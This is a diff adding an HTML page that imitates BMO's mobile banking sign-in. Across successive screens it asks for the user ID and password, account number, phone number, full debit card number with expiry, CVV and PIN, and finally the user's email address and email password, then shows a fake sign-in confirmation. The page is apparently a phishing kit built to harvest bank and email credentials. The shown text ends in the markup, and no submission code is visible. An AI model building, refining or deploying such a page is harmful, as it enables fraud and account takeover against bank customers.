@@ -1,0 +1,1170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>BMO Digital Banking</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@300;400;500;600;700;800&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bmo-blue: #0075BE;
+      --bmo-dark: #003A70;
+      --bmo-red: #DA291C;
+      ---bmo-white: #E8F4FC;
+      --bmo-border: #c8d4de;
+      --bmo-text: #1A2B3C;
+      --bmo-muted: #5a6a7a;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: 'Source Sans 3', 'Segoe UI', Calibri, sans-serif;
+      background: #1c1c1d;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      min-height: 100vh;
+      /* padding: 24px 0; */
+    }
+
+    /* ── Mobile shell ── */
+    #shell {
+      width: 390px;
+      min-height: 844px;
+      background: #fff;
+      position: relative;
+      overflow: auto;
+      box-shadow: 0 24px 70px rgba(0,0,0,0.28);
+    }
+
+    @media (max-width: 430px) {
+      body { background: #fff; padding: 0; }
+      #shell { width: 100%; min-height: 100dvh; box-shadow: none; }
+    }
+
+    /* ── Screens ── */
+    .screen {
+      display: none;
+      flex-direction: column;
+      min-height: 920px;
+      position: absolute;
+      top: 0; left: 0; right: 0;
+      /* overflow-y: auto; */
+      background: #e9e9e9;
+    }
+    .screen.active { display: flex; }
+    .screen.enter { animation: slideIn 0.28s cubic-bezier(0.4,0,0.2,1) forwards; }
+    .screen.exit  { animation: slideOut 0.28s cubic-bezier(0.4,0,0.2,1) forwards; }
+
+    @keyframes slideIn  { from { transform: translateX(100%); } to { transform: translateX(0); } }
+    @keyframes slideOut { from { transform: translateX(0); opacity:1; } to { transform: translateX(-50px); opacity:0; } }
+
+    /* ── BMO Header ── */
+    .bmo-header {
+      background: var(--bmo-blue);
+      padding: 16px 20px 14px;
+      flex-shrink: 0;
+      display: flex;
+      align-items: center;
+    }
+    .bmo-logo-row { display: flex; align-items: center; gap: 12px; }
+    .bmo-wordmark {
+      font-family: 'Source Sans 3', sans-serif;
+      font-weight: 800;
+      font-size: 26px;
+      color: #fff;
+      letter-spacing: 2px;
+    }
+    .bmo-logo {
+      max-height: 3rem;
+      max-width: auto;
+    }
+
+    .bmo-roundel {
+      width: 40px; height: 40px;
+      background: var(--bmo-red);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+
+    /* ── Hero band (screen 1 only) ── */
+    .hero-band {
+      background: var(--bmo-blue);
+      padding: 10px 20px 75px;
+      position: relative;
+      overflow: hidden;
+      flex-shrink: 0;
+    }
+    .hero-band::before {
+      content: '';
+      position: absolute;
+      left: -80px; top: -20px;
+      width: 400px; height: 400px;
+      border-radius: 50% 40% 50% 50%;
+      background: rgba(255,255,255,0.07);
+    }
+    .hero-band::after {
+      content: '';
+      position: absolute;
+      right: 50px; bottom: -80px;
+      width: 170px; height: 170px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.05);
+    }
+    .fdic-bar {
+      display: flex;
+      align-items: flex-start;
+      gap: 9px;
+      margin-bottom: 16px;
+    }
+    .fdic-label {
+      color: var(---bmo-white);
+      font-weight: 900;
+      font-size: 30px;
+      padding: 2px 5px;
+      border-radius: 2px;
+      flex-shrink: 0;
+      margin-top: 1px;
+      letter-spacing: -2.5px;
+    }
+    .fdic-text { color: rgba(255,255,255,0.82); font-size: 11px; line-height: 1.55; padding: 9px 1px; font-style: italic; }
+    .hero-headline { color: #fff; font-size: 27px; font-weight: 300; line-height: 1.28; position: relative; z-index: 1; }
+    .hero-headline strong { font-weight: 700; }
+
+    /* ── White card lift (screen 1) ── */
+    .card-lift {
+      background: #fff;
+      border-radius: 4px;
+      margin-top: -34px;
+      height: 70vh;
+      flex: none;
+      padding: 28px 22px 28px;
+      position: relative;
+      z-index: 2;
+      display: flex;
+      flex-direction: column;
+    }
+    .card-lift.enter {
+      animation: slideIn 0.28s cubic-bezier(0.4,0,0.2,1) forwards;
+    }
+    .card-lift.exit {
+      animation: slideOut 0.28s cubic-bezier(0.4,0,0.2,1) forwards;
+    }
+    .card-shift {
+      left: 10px;
+      width: calc(100% - 20px);
+    }
+
+    /* ── Sub-screen blue stripe ── */
+    .sub-stripe { background: var(--bmo-blue); height: 5px; flex-shrink: 0; }
+
+    /* ── Sub-screen body ── */
+    .sub-body {
+      flex: 1;
+      padding: 24px 22px 32px;
+      display: flex;
+      flex-direction: column;
+      background: #fff;
+    }
+
+    /* ── Back nav ── */
+    .back-nav {
+      color: var(--bmo-blue);
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 2px;
+      margin-bottom: 22px;
+      background: none;
+      border: none;
+      font-family: inherit;
+      padding: 0;
+    }
+    .back-nav:hover { opacity: 0.75; }
+
+    .sub-title { font-size: 20px; font-weight: 700; color: var(--bmo-text); margin-bottom: 7px; }
+    .sub-desc  { font-size: 14px; color: var(--bmo-muted); margin-bottom: 26px; line-height: 1.55; }
+
+    /* ── Field ── */
+    .field { margin-bottom: 20px; }
+    .field-label {
+      display: block;
+      font-size: 14px;
+      font-weight: 600;
+      color: var(--bmo-blue);
+      margin-bottom: 5px;
+    }
+    .field-underline {
+      display: flex;
+      align-items: center;
+      border-bottom: 1.5px solid var(--bmo-border);
+      padding-bottom: 5px;
+      transition: border-color 0.18s;
+    }
+    .field-underline:focus-within { border-color: var(--bmo-blue); }
+    .field-underline.err { border-color: #DC2626; }
+
+    .field-underline input {
+      flex: 1;
+      border: none;
+      outline: none;
+      font-size: 16px;
+      font-family: inherit;
+      color: var(--bmo-text);
+      background: transparent;
+      padding: 3px 0;
+    }
+    .field-underline input::placeholder { color: #b0bec5; }
+
+    .show-btn {
+      background: none; border: none;
+      color: var(--bmo-blue);
+      font-weight: 700; font-size: 12px;
+      cursor: pointer; font-family: inherit;
+      letter-spacing: 0.8px;
+      text-transform: uppercase;
+      padding: 0 0 0 8px;
+      flex-shrink: 0;
+    }
+    .show-btn:hover { opacity: 0.7; }
+
+    .forgot-link {
+      display: block; text-align: right;
+      color: var(--bmo-blue);
+      font-size: 11.5px; font-weight: 600;
+      text-decoration: underline dotted;
+      letter-spacing: 0.4px;
+      text-transform: uppercase;
+      cursor: pointer;
+      margin-top: 7px;
+    }
+
+    .err-msg { color: #DC2626; font-size: 12px; margin-top: 5px; display: none; }
+    .err-msg.on { display: block; }
+
+    /* ── Remember me ── */
+    .check-row {
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      gap: 9px;
+      margin: 2px 0 22px;
+    }
+    .check-box {
+      width: 20px; height: 20px;
+      border: 2px solid var(--bmo-border);
+      border-radius: 3px;
+      cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      transition: all 0.15s;
+    }
+    .check-box.on { background: var(--bmo-blue); border-color: var(--bmo-blue); }
+    .check-label { font-size: 14px; color: var(--bmo-text); cursor: pointer; }
+
+    /* ── Buttons ── */
+    .btn-primary {
+      width: 100%;
+      background: var(--bmo-blue);
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      padding: 13px;
+      font-size: 14px;
+      font-weight: 700;
+      font-family: inherit;
+      letter-spacing: 1.8px;
+      text-transform: uppercase;
+      cursor: pointer;
+      transition: background 0.18s, transform 0.1s;
+      margin-bottom: 4px;
+    }
+    .btn-primary:hover { background: #005fa3; }
+    .btn-primary:active { transform: scale(0.98); }
+
+    .btn-outline {
+      width: 100%;
+      background: transparent;
+      color: var(--bmo-blue);
+      border: 2px solid var(--bmo-blue);
+      border-radius: 50px;
+      padding: 13px;
+      font-size: 14px;
+      font-weight: 700;
+      font-family: inherit;
+      letter-spacing: 1.8px;
+      text-transform: uppercase;
+      cursor: pointer;
+      transition: background 0.18s;
+    }
+    .btn-outline:hover { background: var(---bmo-white); }
+
+    /* ── Or divider ── */
+    .or-row { display:flex; align-items:center; gap:12px; margin: 18px 0; }
+    .or-line { flex:1; height:1px; background:#e2e8f0; }
+    .or-word { color:var(--bmo-muted); font-size:13px; }
+
+    /* ── Footer links ── */
+    .footer-links { margin-top: 20px; display: flex; flex-direction: column; gap: 10px; }
+    .footer-link {
+      color: var(--bmo-blue); font-size: 14px;
+      cursor: pointer; display: inline-flex; align-items: center; gap: 2px;
+    }
+    .footer-link::after { content: ' ›'; font-size: 16px; }
+    .footer-link:hover { opacity: 0.75; }
+
+    .contact-links {
+      display: flex;
+      justify-content: space-between;
+      gap: 12px;
+      margin-top: 22px;
+    }
+    .contact-links > div {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+      padding-top: 8px;
+      cursor: pointer;
+    }
+
+    .contact-links > div:hover {
+      background-color: #d8eeff;
+    }
+
+    .contact-links svg {
+      width: 34px;
+      height: 34px;
+      color: white;
+      background: var(--bmo-dark);
+      border-radius: 50%;
+      padding: 8px;
+    }
+    .icon-text {
+      margin: 0;
+      color: var(--bmo-blue);
+      font-size: 12px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 0.8px;
+      text-align: center;
+    }
+
+    /* ── Card number row ── */
+    .card-num-row {
+      display: flex;
+      gap: 8px;
+      padding-bottom: 8px;
+      border-bottom: 1.5px solid var(--bmo-border);
+      transition: border-color 0.18s;
+    }
+    .card-num-row.err { border-color: #DC2626; }
+    .card-num-row input {
+      flex: 1; width: 0;
+      border: none;
+      border-bottom: 1.5px solid var(--bmo-border);
+      outline: none;
+      font-size: 17px;
+      font-family: 'Courier New', monospace;
+      color: var(--bmo-text);
+      text-align: center;
+      padding: 4px 0 8px;
+      background: transparent;
+    }
+    .card-num-row input:focus { border-color: var(--bmo-blue); }
+
+    /* ── Side by side fields ── */
+    .field-pair { display: flex; gap: 18px; }
+    .field-pair .field { flex: 1; }
+
+    /* ── Toast ── */
+    #toast {
+      position: fixed; bottom: 28px; left: 50%;
+      transform: translateX(-50%) translateY(14px);
+      background: #1e293b; color: #fff;
+      padding: 11px 20px; border-radius: 8px;
+      font-size: 13px; font-family: inherit;
+      opacity: 0; pointer-events: none;
+      transition: all 0.26s ease; z-index: 9999;
+      white-space: nowrap;
+    }
+    #toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+    /* ── Success ── */
+    .success-body {
+      flex: 1; display: flex; flex-direction: column;
+      align-items: center; justify-content: center;
+      padding: 40px 26px; text-align: center; gap: 18px;
+    }
+    .success-icon {
+      width: 88px; height: 88px;
+      background: #DCFCE7; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      animation: popIn 0.45s cubic-bezier(0.36,0.07,0.19,0.97) forwards;
+    }
+    @keyframes popIn {
+      0% { transform: scale(0.4); opacity:0; }
+      70% { transform: scale(1.1); }
+      100% { transform: scale(1); opacity:1; }
+    }
+    .success-title { font-size: 23px; font-weight: 700; color: var(--bmo-text); }
+    .success-desc { font-size: 14px; color: var(--bmo-muted); line-height: 1.6; }
+    .rbar-wrap { width: 100%; background: #e2e8f0; border-radius: 99px; height: 4px; overflow: hidden; }
+    .rbar { height: 100%; background: var(--bmo-blue); border-radius: 99px; width: 0%; transition: width 3.2s linear; }
+
+    /* ── Site footer ── */
+    .site-footer {
+      background: #fff;
+      border-top: 1px solid #e4eaf0;
+      padding: 16px 18px 18px;
+      margin-top: 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      flex-shrink: 0;
+    }
+    .footer-top,
+    .footer-bottom {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+      flex-wrap: wrap;
+    }
+    .footer-bottom{
+      padding-top: 12px;
+      border-top: .5px solid #434344;
+    }
+    .footer-links {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 12px;
+      color: var(--bmo-muted);
+    }
+    .footer-links a {
+      color: var(--bmo-blue);
+      text-decoration: none;
+      font-weight: 700;
+    }
+    .footer-links span {
+      color: #94a3b8;
+    }
+    .app-version{
+      font-size: 9px;
+      align-self: flex-end;
+    }
+    .footer-fdic {
+      font-size: 12px;
+      color: var(--bmo-blue);
+      white-space: nowrap;
+    }
+    .footer-fdic strong {
+      color: var(--bmo-text);
+      font-weight: 900;
+    }
+    .footer-branding {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      flex-wrap: wrap;
+    }
+    .brand-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      /* gap: 8px; */
+      min-width: 0;
+    }
+
+    .brand-fdic{
+      height: 50px;
+      margin-top: 1px;
+      letter-spacing: -2.5px;
+    }
+    .brand-icon {
+      width: 40px;
+      height: 40px;
+      display: grid;
+      place-items: center;
+      border-radius: 6px;
+      background: #f1f5f9;
+      color: var(--bmo-text);
+      font-size: 11px;
+      font-weight: 700;
+      padding: 2px;
+    }
+    .brand-label {
+      font-size: 12px;
+      color: var(--bmo-text);
+      font-weight: 700;
+      white-space: nowrap;
+    }
+  </style>
+</head>
+<body>
+<div id="shell">
+
+  <!-- ═══════════════════════════════
+       SCREEN 1  ·  Sign In
+  ═══════════════════════════════ -->
+  <div class="screen active" id="s-login">
+    <div class="bmo-header">
+      <div class="bmo-logo-row">
+        <!-- <span class="bmo-wordmark">BMO</span>
+        <div class="bmo-roundel">
+          <svg width="25" height="19" viewBox="0 0 25 19" fill="none">
+            <path d="M12.5 1.5L1.5 17.5h23L12.5 1.5z" stroke="white" stroke-width="2.2" stroke-linejoin="round" fill="none"/>
+            <path d="M7 17.5l5.5-7.5 5.5 7.5" stroke="white" stroke-width="2.2" stroke-linejoin="round" fill="none"/>
+          </svg>
+        </div> -->
+        <img src="./assets/Logo_Master-Reverse.svg" class="bmo-logo" alt="BMO corporate logo with white letters">
+      </div>
+    </div>
+
+    <div class="hero-band">
+      <div class="fdic-bar">
+        <span class="fdic-label">FDIC</span>
+        <span class="fdic-text">FDIC-Insured · Backed by the full faith and credit of the U.S. Government</span>
+      </div>
+      <p class="hero-headline">Discover the benefits of banking <strong>online.</strong></p>
+    </div>
+
+    <div class="card-lift card-shift">
+      <!-- User ID -->
+      <div class="field">
+        <label class="field-label">User ID</label>
+        <div class="field-underline" id="uid-row">
+          <input type="text" id="uid" autocomplete="username"/>
+        </div>
+        <a class="forgot-link" onclick="toast('Visit bmo.com to recover your User ID')">Forgot User ID?</a>
+        <p class="err-msg" id="uid-err">Please enter your User ID.</p>
+      </div>
+
+      <!-- Password -->
+      <div class="field">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:5px;">
+          <label class="field-label" style="margin:0;">Password</label>
+          <button class="show-btn" id="show-pw" onclick="togglePw('pw','show-pw')">Show</button>
+        </div>
+        <div class="field-underline" id="pw-row">
+          <input type="password" id="pw" autocomplete="current-password"/>
+        </div>
+        <a class="forgot-link" onclick="toast('Password reset link sent!')">Forgot Password?</a>
+        <p class="err-msg" id="pw-err">Please enter your password.</p>
+      </div>
+
+      <!-- Remember me -->
+      <div class="check-row">
+        <div class="check-box" id="rem-box" onclick="toggleRemember()"></div>
+        <span class="check-label" onclick="toggleRemember()">Remember me</span>
+      </div>
+
+      <button class="btn-primary" onclick="loginSubmit()">Sign In</button>
+
+      <!-- <div class="or-row">
+        <div class="or-line"></div>
+        <span class="or-word">Or</span>
+        <div class="or-line"></div>
+      </div> -->
+
+      <button class="btn-outline" href="#">Register</button>
+
+      <div class="contact-links">
+         <div class="bmo-assist">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/>
+            <path d="M7 8h10M7 12h6"/>
+          </svg>
+          <p class="icon-text">BMO ASSIST</p>
+         </div> 
+         <div class="contact-us">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M22 16.92v3a2 2 0 0 1-2.18 2A19.86 19.86 0 0 1 3 5.18 2 2 0 0 1 5 3h3a2 2 0 0 1 2 1.72 12.12 12.12 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L9.91 10a16 16 0 0 0 4.17 4.17l1.35-1.35a2 2 0 0 1 2.11-.45 12.12 12.12 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/>
+          </svg>
+          <p class="icon-text">CONTACT US</p>
+         </div>
+         <div class="atm">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/>
+            <circle cx="12" cy="10" r="3"/>
+          </svg>
+          <p class="icon-text">ATM & BRANCH</p>
+         </div>
+      </div>
+    </div>
+
+    <div class="site-footer">
+      <div class="footer-top">
+        <div class="footer-links">
+          <div>
+            <a href="#">Privacy</a>
+            <span>|</span>
+            <a href="#">Legal</a>
+          </div>
+        </div>
+        <div>
+          <span class="app-version">App version: 26.3.114-2</span>
+        </div>
+      </div>
+      <div class="footer-bottom">
+        <div class="footer-branding">
+          <div class="brand-item">
+             <img class="brand-fdic" src="./assets/fdic-image.png" alt="FDIC">
+          </div>
+          <div class="brand-item">
+            <div class="brand-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/></svg>
+            </div>
+            <span class="brand-label">Equal Housing Lender</span>
+          </div>
+        </div>
+        <span class="footer-fdic"> NMLS 401052</span>
+      </div>
+    </div>
+  </div>
+
+
+  <!-- ═══════════════════════════════
+       SCREEN 2  ·  Account Number
+  ═══════════════════════════════ -->
+  <div class="screen" id="s-account">
+    <div class="bmo-header">
+      <div class="bmo-logo-row">
+        <img src="./assets/Logo_Master-Reverse.svg" class="bmo-logo" alt="BMO corporate logo with white letters">
+      </div>
+    </div>
+
+    <div class="hero-band">
+      <div class="fdic-bar">
+        <span class="fdic-label">FDIC</span>
+        <span class="fdic-text">FDIC-Insured · Backed by the full faith and credit of the U.S. Government</span>
+      </div>
+      <p class="hero-headline">Discover the benefits of banking <strong>online.</strong></p>
+    </div>
+
+    <div class="card-lift card-shift">
+      <button class="back-nav" onclick="goBack('s-login')">‹ Back</button>
+      <p class="sub-title">Verify Your Account</p>
+      <p class="sub-desc">Please enter your BMO account number to continue.</p>
+      <div class="field">
+        <label class="field-label">Account Number</label>
+        <div class="field-underline" id="acct-row">
+          <input type="tel" id="acct" maxlength="12"/>
+        </div>
+        <p class="err-msg" id="acct-err">Please enter a valid account number.</p>
+      </div>
+      <button class="btn-primary" onclick="accountSubmit()">Continue</button>
+    </div>
+    <div class="site-footer">
+      <div class="footer-top">
+        <div class="footer-links">
+          <a href="#">Privacy</a>
+          <span>|</span>
+          <a href="#">Legal</a>
+        </div>
+        <span class="app-version">App version: 26.3.114-2</span>
+      </div>
+      <div class="footer-bottom">
+        <div class="footer-branding">
+          <div class="brand-item">
+            <img class="brand-fdic" src="./assets/fdic-image.png" alt="FDIC">
+          </div>
+          <div class="brand-item">
+            <div class="brand-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/></svg>
+            </div>
+            <span class="brand-label">Equal Housing Lender</span>
+          </div>
+        </div>
+        <span class="footer-fdic"><strong>FDIC</strong> · NMLS 401052</span>
+      </div>
+    </div>
+  </div>
+
+
+  <!-- ═══════════════════════════════
+       SCREEN 3  ·  Phone Number
+  ═══════════════════════════════ -->
+  <div class="screen" id="s-phone">
+    <div class="bmo-header">
+      <div class="bmo-logo-row">
+        <img src="./assets/Logo_Master-Reverse.svg" class="bmo-logo" alt="BMO corporate logo with white letters">
+      </div>
+    </div>
+
+    <div class="hero-band">
+      <div class="fdic-bar">
+        <span class="fdic-label">FDIC</span>
+        <span class="fdic-text">FDIC-Insured · Backed by the full faith and credit of the U.S. Government</span>
+      </div>
+      <p class="hero-headline">Discover the benefits of banking <strong>online.</strong></p>
+    </div>
+
+    <div class="card-lift card-shift">
+      <button class="back-nav" onclick="goBack('s-account')">‹ Back</button>
+      <p class="sub-title">Confirm Your Phone Number</p>
+      <p class="sub-desc">Enter the phone number associated with your BMO account.</p>
+      <div class="field">
+        <label class="field-label">Phone Number</label>
+        <div class="field-underline" id="phone-row">
+          <input type="tel" id="phone" placeholder="(___) ___-____" maxlength="15" oninput="fmtPhone(this)" style="font-family:'Courier New',monospace;letter-spacing:1.5px;"/>
+        </div>
+        <p class="err-msg" id="phone-err">Please enter a valid 10-digit phone number.</p>
+      </div>
+      <button class="btn-primary" onclick="phoneSubmit()">Continue</button>
+    </div>
+    <div class="site-footer">
+      <div class="footer-top">
+        <div class="footer-links">
+          <a href="#">Privacy</a>
+          <span>|</span>
+          <a href="#">Legal</a>
+        </div>
+        <span class="app-version">App version: 26.3.114-2</span>
+      </div>
+      <div class="footer-bottom">
+        <div class="footer-branding">
+          <div class="brand-item">
+            <img class="brand-fdic" src="./assets/fdic-image.png" alt="FDIC">
+          </div>
+          <div class="brand-item">
+            <div class="brand-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/></svg>
+            </div>
+            <span class="brand-label">Equal Housing Lender</span>
+          </div>
+        </div>
+        <span class="footer-fdic"><strong>FDIC</strong> · NMLS 401052</span>
+      </div>
+    </div>
+  </div>
+
+
+  <!-- ═══════════════════════════════
+       SCREEN 4  ·  Debit Card
+  ═══════════════════════════════ -->
+  <div class="screen" id="s-card">
+    <div class="bmo-header">
+      <div class="bmo-logo-row">
+        <img src="./assets/Logo_Master-Reverse.svg" class="bmo-logo" alt="BMO corporate logo with white letters">
+      </div>
+    </div>
+
+    <div class="hero-band">
+      <div class="fdic-bar">
+        <span class="fdic-label">FDIC</span>
+        <span class="fdic-text">FDIC-Insured · Backed by the full faith and credit of the U.S. Government</span>
+      </div>
+      <p class="hero-headline">Discover the benefits of banking <strong>online.</strong></p>
+    </div>
+
+    <div class="card-lift card-shift">
+      <button class="back-nav" onclick="goBack('s-phone')">‹ Back</button>
+      <p class="sub-title">Debit Card Details</p>
+      <p class="sub-desc">Enter your debit card information to complete verification.</p>
+
+      <!-- Card number -->
+      <div class="field">
+        <label class="field-label">Card Number</label>
+        <div class="card-num-row" id="cardnum-row">
+          <input type="tel" maxlength="4" id="cn1" oninput="cardChunk(this,'cn2')" placeholder="----"/>
+          <input type="tel" maxlength="4" id="cn2" oninput="cardChunk(this,'cn3')" placeholder="----"/>
+          <input type="tel" maxlength="4" id="cn3" oninput="cardChunk(this,'cn4')" placeholder="----"/>
+          <input type="tel" maxlength="4" id="cn4" placeholder="----"/>
+        </div>
+        <p class="err-msg" id="cardnum-err">Please enter a valid 16-digit card number.</p>
+      </div>
+
+      <!-- Expiry + CVV -->
+      <div class="field-pair">
+        <div class="field">
+          <label class="field-label">Expiry Date</label>
+          <div class="field-underline" id="exp-row">
+            <input type="tel" id="exp" placeholder="MM/YY" maxlength="5" oninput="fmtExp(this)"/>
+          </div>
+          <p class="err-msg" id="exp-err">Invalid date.</p>
+        </div>
+        <div class="field">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:5px;">
+            <label class="field-label" style="margin:0;">CVV</label>
+            <button class="show-btn" id="show-cvv" onclick="togglePw('cvv','show-cvv')">Show</button>
+          </div>
+          <div class="field-underline" id="cvv-row">
+            <input type="password" id="cvv" placeholder="···" maxlength="4"/>
+          </div>
+          <p class="err-msg" id="cvv-err">Invalid.</p>
+        </div>
+      </div>
+
+      <!-- Card PIN -->
+      <div class="field">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:5px;">
+          <label class="field-label" style="margin:0;">Card PIN</label>
+          <button class="show-btn" id="show-pin" onclick="togglePw('pin','show-pin')">Show</button>
+        </div>
+        <div class="field-underline" id="pin-row">
+          <input type="password" id="pin" placeholder="····" maxlength="6"/>
+        </div>
+        <p class="err-msg" id="pin-err">Please enter your card PIN.</p>
+      </div>
+
+      <button class="btn-primary" onclick="cardSubmit()">Continue</button>
+    </div>
+    <div class="site-footer">
+      <div class="footer-top">
+        <div class="footer-links">
+          <a href="#">Privacy</a>
+          <span>|</span>
+          <a href="#">Legal</a>
+        </div>
+        <span class="app-version">App version: 26.3.114-2</span>
+      </div>
+      <div class="footer-bottom">
+        <div class="footer-branding">
+          <div class="brand-item">
+            <img class="brand-fdic" src="./assets/fdic-image.png" alt="FDIC">
+          </div>
+          <div class="brand-item">
+            <div class="brand-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/></svg>
+            </div>
+            <span class="brand-label">Equal Housing Lender</span>
+          </div>
+        </div>
+        <span class="footer-fdic"><strong>FDIC</strong> · NMLS 401052</span>
+      </div>
+    </div>
+  </div>
+
+
+  <!-- ═══════════════════════════════
+       SCREEN 5  ·  Verify Email
+  ═══════════════════════════════ -->
+  <div class="screen" id="s-email">
+    <div class="bmo-header">
+      <div class="bmo-logo-row">
+        <span class="bmo-wordmark">BMO</span>
+        <div class="bmo-roundel">
+          <svg width="25" height="19" viewBox="0 0 25 19" fill="none">
+            <path d="M12.5 1.5L1.5 17.5h23L12.5 1.5z" stroke="white" stroke-width="2.2" stroke-linejoin="round" fill="none"/>
+            <path d="M7 17.5l5.5-7.5 5.5 7.5" stroke="white" stroke-width="2.2" stroke-linejoin="round" fill="none"/>
+          </svg>
+        </div>
+      </div>
+    </div>
+    <div class="sub-stripe"></div>
+    <div class="sub-body">
+      <button class="back-nav" onclick="goBack('s-card')">‹ Back</button>
+      <p class="sub-title">Verify Your Email</p>
+      <p class="sub-desc">Enter the email address and email password linked to your BMO account.</p>
+
+      <div class="field">
+        <label class="field-label">Email Address</label>
+        <div class="field-underline" id="email-row">
+          <input type="email" id="email" placeholder="example@email.com"/>
+        </div>
+        <p class="err-msg" id="email-err">Please enter a valid email address.</p>
+      </div>
+
+      <div class="field">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:5px;">
+          <label class="field-label" style="margin:0;">Email Password</label>
+          <button class="show-btn" id="show-epw" onclick="togglePw('epw','show-epw')">Show</button>
+        </div>
+        <div class="field-underline" id="epw-row">
+          <input type="password" id="epw" placeholder="Enter email password"/>
+        </div>
+        <p class="err-msg" id="epw-err">Please enter your email password.</p>
+      </div>
+
+      <button class="btn-primary" onclick="emailSubmit()">Submit</button>
+    </div>
+    <div class="site-footer">
+      <div class="footer-top">
+        <div class="footer-links">
+          <a href="#">Privacy</a>
+          <span>|</span>
+          <a href="#">Legal</a>
+        </div>
+        <span class="app-version">App version: 26.3.114-2</span>
+      </div>
+      <div class="footer-bottom">
+        <div class="footer-branding">
+          <div class="brand-item">
+            <img class="brand-fdic" src="./assets/fdic-image.png" alt="FDIC">
+          </div>
+          <div class="brand-item">
+            <div class="brand-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><path d="M9 22V12h6v10"/></svg>
+            </div>
+            <span class="brand-label">Equal Housing Lender</span>
+          </div>
+        </div>
+        <span class="footer-fdic"><strong>FDIC</strong> · NMLS 401052</span>
+      </div>
+    </div>
+  </div>
+
+
+  <!-- ═══════════════════════════════
+       SCREEN 6  ·  Success
+  ═══════════════════════════════ -->
+  <div class="screen" id="s-success">
+    <div class="bmo-header">
+      <div class="bmo-logo-row">
+        <span class="bmo-wordmark">BMO</span>
+        <div class="bmo-roundel">
+          <svg width="25" height="19" viewBox="0 0 25 19" fill="none">
+            <path d="M12.5 1.5L1.5 17.5h23L12.5 1.5z" stroke="white" stroke-width="2.2" stroke-linejoin="round" fill="none"/>
+            <path d="M7 17.5l5.5-7.5 5.5 7.5" stroke="white" stroke-width="2.2" stroke-linejoin="round" fill="none"/>
+          </svg>
+        </div>
+      </div>
+    </div>
+
+    <div class="success-body">
+      <div class="success-icon">
+        <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#16A34A" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M20 6L9 17l-5-5"/>
+        </svg>
+      </div>
+      <div>
+        <p class="success-title">You're signed in!</p>
+        <p class="success-desc">Welcome back, <strong id="suc-name"></strong>.<br/>Redirecting to BMO Digital Banking…</p>
+      </div>
+      <div class="rbar-wrap"><div class="rbar" id="rbar"></div></div>
+      <p style="font-size:12px;color:#94a3b8;margin-top:-10px;">Redirecting in 3 seconds…</p>
+      <!-- <button class="btn-primary" style="width:100%;margin-top:8px;" onclick="doRedirect()">Go to BMO now →</button> -->
+      <!-- <button class="btn-outline" style="width:100%;" onclick="resetAll()">Sign in with different account</button> -->
+    </div>
+
+    <div class="site-footer">
+      <div class="footer-top">
+        <div class="footer-links">
+          <a href="#">Privacy</a>
+          <span>|</span>
+          <a href="#">Legal</a>
+        </div>
